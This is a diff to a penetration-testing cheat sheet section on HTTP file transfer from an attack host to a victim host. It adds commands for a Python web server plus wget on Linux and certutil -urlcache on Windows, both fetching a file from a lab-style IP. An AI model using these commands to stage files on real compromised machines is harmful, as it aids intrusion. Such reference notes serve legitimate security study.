@@ -9,11 +9,19 @@
 ## HTTP file transfer
 ### From Attack host to Victim host (Linux)
 * python web server + wget
+<pre>
+<b># attack machine</b>
+$ python -m http.server 8000
+<b># victim machine</b>
+$ wget http://10.10.10.2:8000/file.txt
+</pre>
 ### From Attack host to Victim host (Windows)
 * python web server + powershell iwr
 * python web server + certutil
 <pre>
+<b># attack machine</b>
 $ python -m http.server 8000
+<b># victim machine</b>
 C:\> certutil -urlcache -split -f http://10.10.10.2:8000/file.txt
 </pre>
 ### From Victim host (Linux) to Attack host
